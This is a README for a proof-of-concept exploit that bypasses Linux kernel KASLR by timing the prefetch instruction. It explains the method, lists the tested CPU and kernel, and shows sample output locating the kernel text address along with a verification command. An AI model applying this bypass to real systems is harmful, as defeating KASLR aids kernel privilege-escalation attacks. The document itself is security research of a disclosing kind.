kaslr-bypass-via-prefetch
=========================

This is a proof-of-concept exploit for a KASLR bypass for the Linux kernel via timing the prefetch instruction.
Inspired by [a blogpost by Anders Fogh](http://dreamsofastone.blogspot.ru/2016/02/breaking-kasrl-with-micro-architecture.html).

The exploit works by measuring the time required to prefetch a particular address in the kernel space.
The idea is that a prefetch instruction is faster on virtual addresses which actually map to a page.
The used measuring approach is kind of best effort, but seems to be working.
See the source code for details.

The exploit was tested on a machine with Intel Core i7-4510 running Ubuntu 15.10 with 4.2.0-16-generic kernel and KASLR enabled.
Other setups might require other threshold values or a different number of measuring steps for the exploit to work.
I'd guess that it might not work at all for some CPUs.

Since [the KASLR for the Linux kernel is not really that random](https://lwn.net/Articles/569635/), the number of slots for the kernel text is quite limited, which allows to figure out the text location in a reasonable time.

0xffffffff8d000000 0.0
0xffffffff8d000000 0.0
0xffffffff8d000000 0.0
0xffffffff8d000000 accepted
the kernel is probably at 0xffffffff8d000000
```

You can confirm the kernel text address with:
``` bash
$ sudo cat /proc/kallsyms | grep 'T _text'
ffffffff8d000000 T _text
```
